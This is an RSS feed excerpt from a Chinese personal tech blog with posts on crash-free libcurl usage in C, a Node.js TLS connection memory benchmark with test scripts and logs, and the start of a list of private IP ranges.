<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>看看俺 – KanKanAn.com</title>
        <description>记我所思，忆我所为。</description>
        <link>http://blog.kankanan.com</link>
        <lastBuildDate>Mon, 21 Dec 2015 10:21:33 GMT</lastBuildDate>
        <docs>http://blogs.law.harvard.edu/tech/rss</docs>
        <image>
            <title>看看俺 – KanKanAn.com</title>
            <url>http://blog.kankanan.com/static/favicon.ico</url>
            <link>http://blog.kankanan.com</link>
        </image>
        <copyright>版权所有 © 2011-2015 看看俺 – KanKanAn.com</copyright>
        <generator>Feed for Node.js</generator>
        <category>ediary</category>
        <category>技术</category>
        <category>生活</category>
        <item>
            <title><![CDATA[安全使用libcurl的正确姿势]]></title>
            <link>/article/5b8951684f7f7528-libcurl-76846b63786e59ff52bf.html</link>
            <guid>/article/5b8951684f7f7528-libcurl-76846b63786e59ff52bf.html</guid>
            <pubDate>Mon, 21 Dec 2015 10:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在我们的项目中，数次遇到 <code>libcurl</code> 导致的应用程序崩溃问题，这里总结了一下使用 <code>libcurl</code> 的正确姿势。
</p>

<div class="org-src-container">

<pre class="src src-c"><span class="linenr"> 1: </span><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;curl/curl.h&gt;</span>
<span class="linenr"> 2: </span><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdint.h&gt;</span>
<span class="linenr"> 3: </span><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string.h&gt;</span>
<span class="linenr"> 4: </span>
<span class="linenr"> 5: </span>
<span class="linenr"> 6: </span><span style="color: #b294bb;">#define</span> <span style="color: #f0c674;">RESPONSE_BODY_SIZE</span> 128
<span class="linenr"> 7: </span>
<span class="linenr"> 8: </span><span style="color: #b5bd68;">static</span> <span style="color: #81a2be;">size_t</span> <span style="color: #de935f;">write_function</span>(<span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">void</span> *<span style="color: #f0c674;">buffer</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">size_t</span> <span style="color: #f0c674;">size</span>, <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">size_t</span><span style="text-decoration: underline;"> </span><span style="color: #f0c674; text-decoration: underline;">nmemb</span><span style="text-decoration: underline;">, </span><span style="color: #81a2be; text-decoration: underline;">void</span><span style="text-decoration: underline;"> *</span><span style="color: #f0c674; text-decoration: underline;">user_p</span><span style="text-decoration: underline;">)</span>
<span class="linenr"> 9: </span>{
<span class="linenr">10: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">response_body</span> = (<span style="color: #81a2be;">char</span>*)user_p;
<span class="linenr">11: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">response_body_len</span> = strlen(response_body);
<span class="linenr">12: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">uint32_t</span> <span style="color: #f0c674;">len</span> = size*nmemb;
<span class="linenr">13: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (len &gt; RESPONSE_BODY_SIZE - response_body_len - 1) {
<span class="linenr">14: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   len = RESPONSE_BODY_SIZE - response_body_len - 1;
<span class="linenr">15: </span><span style="background-color: #373b41;"> </span>   }
<span id="coderef-curl_write_function_buffer" class="coderef-off"><span class="linenr">16: </span><span style="background-color: #373b41;"> </span>   memcpy(response_body + response_body_len, buffer, len);</span>
<span id="coderef-curl_write_function_return" class="coderef-off"><span class="linenr">17: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> size*nmemb;</span>
<span class="linenr">18: </span>}
<span class="linenr">19: </span>
<span class="linenr">20: </span><span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
<span class="linenr">21: </span>{
<span class="linenr">22: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">url</span> = <span style="color: #8abeb7;">"http://www.example.com/dns_servers"</span>;
<span class="linenr">23: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">curl_slist</span> *<span style="color: #f0c674;">headers</span> = <span style="color: #81a2be;">NULL</span>;
<span class="linenr">24: </span><span style="background-color: #373b41;"> </span>   headers = curl_slist_append(headers, <span style="color: #8abeb7;">"Content-Type: application/json"</span>);
<span class="linenr">25: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">const</span> <span style="color: #81a2be;">char</span>* <span style="color: #f0c674;">request_body</span> = <span style="color: #8abeb7;">"{\"host\": \"8.8.8.8\", \"port\": 53}"</span>;
<span class="linenr">26: </span>
<span class="linenr">27: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">CURL</span> *<span style="color: #f0c674;">curl</span>;
<span class="linenr">28: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">CURLcode</span> <span style="color: #f0c674;">res</span>;
<span class="linenr">29: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">response_body</span>[RESPONSE_BODY_SIZE] = {<span style="color: #8abeb7;">'\0'</span>};
<span class="linenr">30: </span><span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">long</span> <span style="color: #f0c674;">response_code</span> = 0;
<span class="linenr">31: </span>
<span class="linenr">32: </span><span style="background-color: #373b41;"> </span>   curl = curl_easy_init();
<span class="linenr">33: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(curl) {
<span class="linenr">34: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_URL, url);
<span class="linenr">35: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
<span class="linenr">36: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_POSTFIELDS, request_body);
<span class="linenr">37: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(request_body));
<span id="coderef-curl_nosignal" class="coderef-off"><span class="linenr">38: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);</span>
<span class="linenr">39: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
<span class="linenr">40: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_function);
<span class="linenr">41: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_body);
<span class="linenr">42: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res = curl_easy_perform(curl);
<span class="linenr">43: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (res == CURLE_OK) {
<span id="coderef-curl_response_code" class="coderef-off"><span class="linenr">44: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &amp;response_code<span style="text-decoration: underline;">);</span></span>
<span class="linenr">45: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span class="linenr">46: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(res != CURLE_OK) {
<span class="linenr">47: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"request to %s error(%d): %s"</span>, url, res, curl_easy_s<span style="text-decoration: underline;">trerror(res));</span>
<span class="linenr">48: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span class="linenr">49: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   curl_easy_cleanup(curl);
<span class="linenr">50: </span><span style="background-color: #373b41;"> </span>   }
<span class="linenr">51: </span>
<span class="linenr">52: </span><span style="background-color: #373b41;"> </span>   curl_slist_free_all(headers);
<span class="linenr">53: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (response_code == 201) {
<span class="linenr">54: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"request to %s successful: %s\n"</span>, url, response_body);
<span class="linenr">55: </span><span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
<span class="linenr">56: </span><span style="background-color: #373b41;"> </span>   }
<span class="linenr">57: </span>
<span class="linenr">58: </span><span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"request to %s response failed(%ld): %s\n"</span>, url, response_co<span style="text-decoration: underline;">de, response_body);</span>
<span class="linenr">59: </span><span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 1;
<span class="linenr">60: </span>}
</pre>
</div>

<p>
上面的示例代码要注意的地方：
</p>

<dl class="org-dl">
<dt> 行 <a href="#coderef-curl_write_function_buffer"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_write_function_buffer');" onmouseout="CodeHighlightOff(this, 'coderef-curl_write_function_buffer');">16</a> </dt><dd>buffer不是 <code>\0</code> 结尾的
</dd>

<dt> 行 <a href="#coderef-curl_write_function_return"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_write_function_return');" onmouseout="CodeHighlightOff(this, 'coderef-curl_write_function_return');">17</a> </dt><dd>总是返回 <code>size*nmemb</code>
</dd>

<dt> 行 <a href="#coderef-curl_nosignal"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_nosignal');" onmouseout="CodeHighlightOff(this, 'coderef-curl_nosignal');">38</a> </dt><dd>总是设置这个选项

<p>
<code>libcurl</code> 不支持异步 <code>dns</code> 解析时，会通过 <code>signal</code> 的方式实现 <code>dns</code> 解析设置超时， <code>signal</code> 会导致多线程程序崩溃，后台服务通常都是多线程的，所以应该总是设置这个选项（但是 <code>libcurl</code> 不支持异步 <code>dns</code> 解析时，超时选项将被忽略）。
</p>

<p>
可以通过运行 <code>curl --version</code> 命令或调用 <code>curl_version</code> 函数查看 <code>libcurl</code> 是否支持异步 <code>dns</code> 解析，调用 <code>curl_version_info</code> 函数还可以获得具体的 <code>c-ares</code> 库版本号。
</p>

<p>
编译 <code>libcurl</code> 时，通过为  <code>configure</code> 指定 <code>--enable-threaded-resolver</code> 或 <code>--enable-ares</code> 选项启用异步 <code>dns</code> 解析。
</p>
</dd>

<dt> 行 <a href="#coderef-curl_response_code"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-curl_response_code');" onmouseout="CodeHighlightOff(this, 'coderef-curl_response_code');">44</a> </dt><dd>状态响应码变量必须是 <code>long</code> 类型

<p>
否则会由于内存越界导致程序崩溃。</p>
</dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[tls连接内存占用]]></title>
            <link>/article/tls-8fde63a551855b5853607528.html</link>
            <guid>/article/tls-8fde63a551855b5853607528.html</guid>
            <pubDate>Sun, 20 Dec 2015 16:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们有一个 <code>node.js</code> 服务，有大量 <code>tls</code> 长连接，跑了一段时间后发现内存消耗比较大，每个 <code>node.js</code> 实例维持 <code>3000</code> 个连接需要消耗 <code>1G</code> 略多的内存，但是也不能确定有内存泄露，毕竟内存没有再往上涨导致服务中断，所以觉得有必要测试一下 <code>tls</code> 连接的内存消耗情况。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">tls服务器</h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tls</span>         = require(<span style="color: #8abeb7;">'tls'</span>),
<span style="background-color: #373b41;"> </span>   fs          = require(<span style="color: #8abeb7;">'fs'</span>);


<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">options</span> = {
<span style="background-color: #373b41;"> </span>   key: fs.readFileSync(<span style="color: #8abeb7;">'server.key'</span>),
<span style="background-color: #373b41;"> </span>   cert: fs.readFileSync(<span style="color: #8abeb7;">'server.cert'</span>),
<span style="background-color: #373b41;"> </span>   handshakeTimeout: 10*1000,
<span style="background-color: #373b41;"> </span>   plain: <span style="color: #81a2be;">true</span>,
<span style="background-color: #373b41;"> </span>   ssl: <span style="color: #81a2be;">true</span>
};

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">port</span> = 1234;
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tlsServer</span> = tls.createServer(options, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">socket</span>) {
<span style="background-color: #373b41;"> </span>   socket.on(<span style="color: #8abeb7;">"close"</span>, <span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remoteP<span style="text-decoration: underline;">ort +</span><span style="color: #8abeb7; text-decoration: underline;">') closed'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   });
}).listen(port, <span style="color: #8abeb7;">"0.0.0.0"</span>, <span style="color: #b5bd68;">function</span>(){
<span style="background-color: #373b41;"> </span>   console.log(<span style="color: #8abeb7;">'tls server listening on port('</span> + port + <span style="color: #8abeb7;">')'</span>);
});
tlsServer.maxConnections = 10000;
tlsServer.on(<span style="color: #8abeb7;">'clientError'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">exception</span>, <span style="color: #f0c674;">socket</span>) {
<span style="background-color: #373b41;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remotePort <span style="text-decoration: underline;">+</span><span style="color: #8abeb7; text-decoration: underline;">') error('</span><span style="text-decoration: underline;"> + exception + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   socket.destroy();
});

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">memoryUsage</span>() {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mem</span> = process.memoryUsage();
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">format</span> = <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">bytes</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> (bytes/1024/1024).toFixed(2)+<span style="color: #8abeb7;">'MB'</span>;
<span style="background-color: #373b41;"> </span>   };
<span style="background-color: #373b41;"> </span>   console.log(<span style="color: #8abeb7;">'Process: heapTotal '</span>+format(mem.heapTotal) + <span style="color: #8abeb7;">' heapUsed '</span> + for<span style="text-decoration: underline;">mat(mem.heapUsed) + </span><span style="color: #8abeb7; text-decoration: underline;">' rss '</span><span style="text-decoration: underline;"> + format(mem.rss));</span>
}

setInterval(<span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   tlsServer.getConnections(<span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>, <span style="color: #f0c674;">tlsCount</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   console.error(<span style="color: #8abeb7;">"get tls connections count error("</span> + err.toString() + <span style="color: #8abeb7; text-decoration: underline;">")"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   console.warn(<span style="color: #8abeb7;">"server: tls connections("</span> + tlsCount + <span style="color: #8abeb7;">")"</span>);

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   memoryUsage();
<span style="background-color: #373b41;"> </span>   });
}, 1*1000);
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">tls客户端</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tls</span> = require(<span style="color: #8abeb7;">'tls'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">tlsCount</span> = 0;

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">connect</span>() {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">socket</span> = tls.connect(1234, {rejectUnauthorized: <span style="color: #81a2be;">false</span>}, <span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   tlsCount += 1;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   socket.setEncoding(<span style="color: #8abeb7;">'utf8'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   socket.on(<span style="color: #8abeb7;">'data'</span>, <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">data</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   });
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   socket.on(<span style="color: #8abeb7;">'close'</span>, <span style="color: #b5bd68;">function</span>() {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   tlsCount -= 1;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   });
<span style="background-color: #373b41;"> </span>   });
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">memoryUsage</span>() {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mem</span> = process.memoryUsage();
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">format</span> = <span style="color: #b5bd68;">function</span>(<span style="color: #f0c674;">bytes</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> (bytes/1024/1024).toFixed(2)+<span style="color: #8abeb7;">'MB'</span>;
<span style="background-color: #373b41;"> </span>   };
<span style="background-color: #373b41;"> </span>   console.log(<span style="color: #8abeb7;">'Process: heapTotal '</span>+format(mem.heapTotal) + <span style="color: #8abeb7;">' heapUsed '</span> + for<span style="text-decoration: underline;">mat(mem.heapUsed) + </span><span style="color: #8abeb7; text-decoration: underline;">' rss '</span><span style="text-decoration: underline;"> + format(mem.rss));</span>
}

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">round</span> = 0;
setInterval(<span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (round &lt; 10) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0; i &lt; 100; ++i) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   connect();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   round += 1;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   console.warn(<span style="color: #8abeb7;">"client: tls connections("</span> + tlsCount + <span style="color: #8abeb7;">")"</span>);

<span style="background-color: #373b41;"> </span>   memoryUsage();
}, 1000);
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">tls服务器日志</h2>
<div class="outline-text-2" id="text-3">
<p>
连接从 <code>0</code> 到 <code>1000</code> 内存增长
</p>

<pre class="example">
server: tls connections(0)
Process: heapTotal 9.14MB heapUsed 4.80MB rss 23.69MB
server: tls connections(100)
Process: heapTotal 10.13MB heapUsed 5.59MB rss 29.53MB
server: tls connections(200)
Process: heapTotal 10.13MB heapUsed 6.75MB rss 32.32MB
server: tls connections(300)
Process: heapTotal 9.18MB heapUsed 7.32MB rss 34.37MB
server: tls connections(400)
Process: heapTotal 10.16MB heapUsed 8.11MB rss 37.05MB
server: tls connections(500)
Process: heapTotal 11.14MB heapUsed 8.66MB rss 38.18MB
server: tls connections(600)
Process: heapTotal 11.14MB heapUsed 9.48MB rss 39.73MB
server: tls connections(600)
Process: heapTotal 12.12MB heapUsed 9.62MB rss 40.50MB
server: tls connections(700)
Process: heapTotal 15.04MB heapUsed 10.16MB rss 42.69MB
server: tls connections(800)
Process: heapTotal 18.97MB heapUsed 10.72MB rss 44.50MB
server: tls connections(900)
Process: heapTotal 18.97MB heapUsed 11.68MB rss 46.30MB
server: tls connections(1000)
Process: heapTotal 18.97MB heapUsed 12.63MB rss 47.32MB
</pre>

<p>
tls客户端结束后连接数从 <code>1000</code> 降到 <code>0</code> 约 <code>30</code> 秒后
</p>

<pre class="example">
server: tls connections(0)
Process: heapTotal 22.91MB heapUsed 13.63MB rss 48.44MB
</pre>

<p>
从上面的日志可以计算出：
</p>

<ul class="org-ul">
<li>每 <code>tls</code> 连接 <code>rss</code> 要消耗 <code>24.2KB</code>  <code>heap</code> 要消耗 <code>8KB</code>
</li>

<li>连接关闭后内存没有释放

<p>
还略有增加，要么就是 <code>node.js</code> 没有释放 <code>tls</code> 连接的内存（应该不太可能），要么就是我的代码有问题，没有释放资源
</p>
</li>
</ul>

<p>
使用 <code>heapdump</code> 导出堆数据后通过 <code>Chromium</code> 的开发工具进行分析，发现事情没这么简单，占用的内存绝大部分是代码，
<code>tls</code> 服务器不退出，使用 <code>tls</code> 客户端测试多轮后可以发现 <code>rss</code> 内存占用不会增加， <code>tls</code> 客户端退出关闭所有连接后，
<code>rss</code> 内存占用总是会恢复到同一水平，这就说明代码是没有问题的，应该不存在内存泄露。
</p>

<p>
多轮测试后重新取样：
</p>

<pre class="example">
server: tls connections(0)
Process: heapTotal 21.93MB heapUsed 13.22MB rss 54.06MB
server: tls connections(100)
Process: heapTotal 21.93MB heapUsed 14.16MB rss 54.06MB
server: tls connections(200)
Process: heapTotal 25.86MB heapUsed 14.79MB rss 58.57MB
server: tls connections(300)
Process: heapTotal 25.86MB heapUsed 15.76MB rss 59.08MB
server: tls connections(400)
Process: heapTotal 25.86MB heapUsed 16.69MB rss 59.08MB
server: tls connections(500)
Process: heapTotal 27.83MB heapUsed 16.72MB rss 60.37MB
server: tls connections(600)
Process: heapTotal 27.83MB heapUsed 17.65MB rss 60.37MB
server: tls connections(700)
Process: heapTotal 33.74MB heapUsed 15.76MB rss 59.32MB
server: tls connections(800)
Process: heapTotal 33.74MB heapUsed 16.71MB rss 59.32MB
server: tls connections(800)
Process: heapTotal 33.74MB heapUsed 16.83MB rss 59.32MB
server: tls connections(900)
Process: heapTotal 33.74MB heapUsed 18.31MB rss 59.38MB
server: tls connections(1000)
Process: heapTotal 33.74MB heapUsed 19.24MB rss 59.38MB
</pre>

<p>
从上面的日志可以计算出：
</p>

<ul class="org-ul">
<li>每 <code>tls</code> 连接 <code>rss</code> 要消耗 <code>5.45KB</code> ， <code>heap</code> 要消耗 <code>6.16KB</code>
</li>
</ul>

<p>
也就是说正常情况下， <code>3000</code> 个 <code>tls</code> 连接， <code>rss</code> 会消耗 <code>16MB</code> ， <code>heap</code> 会消耗 <code>18MB</code> ，占用 <code>1G</code> 的问题肯定出在其它地方。
</p>

<p>
另外注意到调用 <code>heapdump.writeSnapshot</code> 后内存占用大幅下降，应该是 <code>heapdump</code> 触发了 <code>v8</code> 的垃圾回收， <code>v8</code> 的垃圾回收应该不是实时精确的，要精确测量内存占用，估计也要像 <code>heapdump</code> 一样让 <code>v8</code> 将全部垃圾回收后再测量。
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">不同版本的node.js结果会有差异</h2>
<div class="outline-text-2" id="text-4">
<p>
为了完全模拟真实环境，针对每一个接收的 <code>tls</code> 连接，除了 <code>close</code> ，还监听了 <code>data</code> 、 <code>error</code> 、 <code>timeout</code> 事件：
</p>

<div class="org-src-container">

<pre class="src src-js">socket.on(<span style="color: #8abeb7;">"data"</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">data</span>) {

});
socket.on(<span style="color: #8abeb7;">"error"</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="background-color: #373b41;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remotePort <span style="text-decoration: underline;">+</span><span style="color: #8abeb7; text-decoration: underline;">') error('</span><span style="text-decoration: underline;"> + err.toString() + </span><span style="color: #8abeb7; text-decoration: underline;">')'</span><span style="text-decoration: underline;">);</span>
});
socket.on(<span style="color: #8abeb7;">"close"</span>, <span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   console.warn(<span style="color: #8abeb7;">'tls client('</span> + socket.remoteAddress + <span style="color: #8abeb7;">':'</span> + socket.remotePort <span style="text-decoration: underline;">+</span><span style="color: #8abeb7; text-decoration: underline;">') closed'</span><span style="text-decoration: underline;">);</span>
});
socket.on(<span style="color: #8abeb7;">"timeout"</span>, <span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   socket.destroy();
});
</pre>
</div>

<p>
前面的测试我使用的是 <code>node-v5.3.0</code> ，我使用 <code>node-v0.12.7</code> 重新测了几轮，最终 <code>rss</code> 内存占用停在 <code>145.5MB</code> ，这还只是 <code>1000</code> 个 <code>tls</code> 连接，使用 <code>3000</code> 个 <code>tls</code> 连接进行测试， <code>rss</code> 内存占用停在 <code>303MB</code> 。再次使用 <code>node-v5.3.0</code> 测试 <code>3000</code> 个 <code>tls</code> 连接， <code>rss</code> 内存占用停在 <code>115MB - 130MB</code> 之间，随着连接的增减有一定的波动。
</p>

<p>
由此看来 <code>tls</code> 连接是要占用一定内存量的，高版本的 <code>node</code> 改进很大，可以考虑升级一下 <code>node</code> 。
</p>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">最后附上 node.js 各个版本的测试结果</h2>
<div class="outline-text-2" id="text-5">
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="left" />

<col  class="left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="left">不同版本的 node.js</th>
<th scope="col" class="left">10000 个 tls 连接</th>
</tr>
</thead>
<tbody>
<tr>
<td class="left">node-v0.12.7</td>
<td class="left">heapTotal 158.34MB  heapUsed 98.62MB   rss 728.26MB</td>
</tr>

<tr>
<td class="left">node-v0.12.9</td>
<td class="left">heapTotal 239.04MB  heapUsed 209.53MB  rss 838.40MB</td>
</tr>

<tr>
<td class="left">node-v4.2.3</td>
<td class="left">heapTotal 86.58MB   heapUsed 81.47MB   rss 222.97MB</td>
</tr>

<tr>
<td class="left">node-v5.3.0</td>
<td class="left">heapTotal 96.73MB   heapUsed 75.23MB   rss 235.11MB</td>
</tr>
</tbody>
</table>

<ul class="org-ul">
<li>测试脚本

<p>
<a href="../static/test_tls_server.js">test_tls_server.js</a>
</p>

<p>
<a href="../static/test_tls_client.js">test_tls_client.js</a>
</p>
</li>

<li>测试命令

<p>
终端 <code>1</code> ( <code>tls</code> 服务器)
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo bash -c <span style="color: #8abeb7;">"(ulimit -n 10240; node ./test_tls_server.js)"</span>
</pre>
</div>

<p>
终端 <code>2</code> ( <code>tls</code> 客户端)
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo bash -c <span style="color: #8abeb7;">"(ulimit -n 10240; for (( i = 0; i &lt; 100; i++)); do echo round \$i;</span><span style="color: #8abeb7; text-decoration: underline;"> node ./test_tls_client.js; done;)"</span>
</pre>
</div>

<p>
内存占用取的是 <code>tls</code> 测试客户端退出后，服务器端最后建立了 <code>10000</code> 个 <code>tls</code> 连接时的内存占用。</p>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[内网IP段有哪些]]></title>
            <link>/article/51857f51-ip-6bb5670954ea4e9b.html</link>
            <guid>/article/51857f51-ip-6bb5670954ea4e9b.html</guid>
            <pubDate>Fri, 18 Dec 2015 06:39:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
常见的内网IP段有：
</p>

<dl class="org-dl">
<dt> 10.0.0.0/8 </dt><dd>10.0.0.0 - 10.255.255.255
</dd>

<dt> 172.16.0.0/12 </dt><dd>172.16.0.0 - 172.31.255.255
</dd>

